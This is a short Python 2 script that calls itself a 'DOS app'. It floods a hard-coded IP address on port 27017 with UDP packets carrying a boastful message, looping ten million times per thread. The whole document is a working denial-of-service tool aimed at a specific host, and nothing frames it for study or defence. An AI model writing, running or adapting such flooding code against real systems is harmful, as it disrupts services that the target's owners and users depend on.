import time, socket, os, sys, string, urllib2, threading
print_lock = threading.Lock()
def attack():
    port = 27017
    host = '194.67.78.195'
    message="#I am the bestest in the world. "
    ip = socket.gethostbyname( host )
    ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ddos.connect((host, port))
    for i in xrange(10000000):
        try:
            ddos.sendto( message, (ip, port))
        except socket.error, msg:
            print("|[Connection Failed]         |")
    ddos.close()
def main():
    print "DOS app started"
    for i in range(10000000):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        t.join()
if __name__ == "__main__":
    main()